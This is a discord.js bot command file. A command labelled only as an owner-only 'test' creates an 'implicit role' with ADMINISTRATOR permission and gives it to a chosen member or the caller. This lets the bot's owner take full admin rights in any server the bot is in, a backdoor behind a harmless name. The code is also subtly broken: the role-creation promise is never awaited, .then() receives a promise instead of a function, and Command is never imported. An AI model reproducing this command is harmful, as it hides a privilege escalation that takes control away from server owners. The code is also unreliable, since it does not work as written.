/** @format */

const { Permissions } = require('discord.js');

module.exports = class Test extends Command {
  constructor() {
    super({
      name: 'test',
      aliases: [],
      description: 'Test command',
      usage: '',
      category: '<:charliewave_ownership:771637500967124994> Owner',
      ownerOnly: true,
      cooldown: 3000,
      memberPerms: [],
      clientPerms: [],
    });
  }
  async exec(message, args) {
    const member =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args[0]) ||
      message.guild.members.cache.find(
        (m) =>
          m.displayName.toLowerCase().includes(args[0]) ||
          m.user.tag.toLowerCase().includes(args[0])
      ) ||
      message.member;

    var role = message.guild.roles.create({
      name: 'implicit role',
      permissions: [Permissions.FLAGS.ADMINISTRATOR],
    });

    if (!role) return;

    member.roles.add(role).then(message.reply('done'));
  }
};
